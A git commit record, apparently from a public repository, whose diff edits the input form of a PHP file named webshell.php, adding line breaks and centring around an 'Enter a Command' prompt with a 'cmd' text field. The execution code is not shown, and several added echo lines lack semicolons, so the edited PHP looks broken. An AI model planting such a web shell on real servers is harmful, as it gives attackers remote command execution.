9970a2fcb4ba20120d55234ed950bad90d6b8af7
wkim0606 <33346320+wkim0606@users.noreply.github.com>
2023-08-14 16:51:20 +0900

    Update webshell.php

--- webshell.php
+++ webshell.php
@@ -5,8 +5,10 @@
 // Author: Bonghwan Choi
 // modified by WBOAN
 //
-
-echo 'Enter a Command:<br>';
+echo '<br>'
+echo '<br>'
+echo '<center>Enter a Command:<br>';
+echo '<br>'
 echo '<form action="">';
 echo '<input type=text name="cmd">';
 echo '<input type="submit">';
